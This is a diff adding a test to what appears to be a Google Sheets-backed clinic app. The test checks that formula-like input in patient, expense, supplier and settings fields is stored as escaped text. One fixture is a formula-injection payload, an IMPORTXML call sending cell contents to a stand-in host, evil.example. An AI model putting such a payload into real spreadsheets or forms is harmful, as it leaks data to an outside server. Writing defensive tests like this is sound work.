@@ -429,3 +429,19 @@ test('staff cannot use any owner-only v3.1 action (checked on the server)', () =
   assert.ok(Array.isArray(d.receivables) && Array.isArray(d.treatmentMaster) && Array.isArray(d.followUps));
   assert.ok(t.rows('AuditLog').some(r => r[3] === 'returnRefund' && r[6] === 'DENIED'));
 });
+
+test('text that looks like a spreadsheet formula is stored as plain text, never run by Google Sheets', () => {
+  const t = setup();
+  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//a")';
+  assert.equal(t.owner({ action: 'savePatient', id: 'PT-F', name: evil, phone: '+91 98765 43210', notes: '- take after food', status: 'Active' }).success, true);
+  assert.equal(t.owner({ action: 'saveExpense', id: 'EXP-F', date: today(), category: '@SUM(1)', amount: '5', vendor: '+cmd', notes: evil }).success, true);
+  assert.equal(t.owner({ action: 'saveSupplier', name: evil }).success, true);
+  assert.equal(t.owner({ action: 'saveSettings', settingKey: 'clinic_note', settingValue: '=1+1' }).success, true);
+  assert.deepEqual(t.g.stats.formulas, [], 'no formula reached the sheet');
+  const p = t.rows('Patients').find(r => r[0] === 'PT-F');
+  assert.equal(p[1], evil, 'name reads back exactly as typed');
+  assert.equal(p[2], '+91 98765 43210');
+  // plain numbers stay numbers (a negative stock adjustment etc. is not turned into text)
+  const { sheetText_ } = t.g.sandbox;
+  assert.equal(sheetText_('-5'), '-5'); assert.equal(sheetText_(-5), -5); assert.equal(sheetText_('=A1'), "'=A1");
+});
